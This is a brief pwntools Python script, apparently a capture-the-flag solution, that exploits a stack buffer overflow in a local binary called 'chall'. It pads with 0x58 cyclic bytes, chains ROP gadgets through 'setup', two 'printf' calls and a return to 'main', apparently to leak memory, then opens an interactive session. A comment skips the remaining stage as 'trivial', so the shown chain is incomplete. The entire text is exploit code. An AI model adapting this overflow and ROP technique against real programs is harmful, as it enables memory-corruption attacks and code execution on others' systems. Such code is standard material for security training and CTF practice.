from pwn import *

context.terminal = "tmux splitw -h".split()
context.binary = elf = ELF('chall', 0)
rop = ROP(elf)

p = elf.process()

payload = cyclic(0x50 + 8)
payload += p64(elf.sym.setup+38) + p64(rop.ret.address) * 2
payload += p64(elf.sym.printf) + p64(rop.ret.address)
payload += p64(elf.sym.printf) + p64(rop.ret.address)
payload += p64(elf.sym.main)

p.sendlineafter(b'> ', payload)

# the rest is trivial

p.interactive()
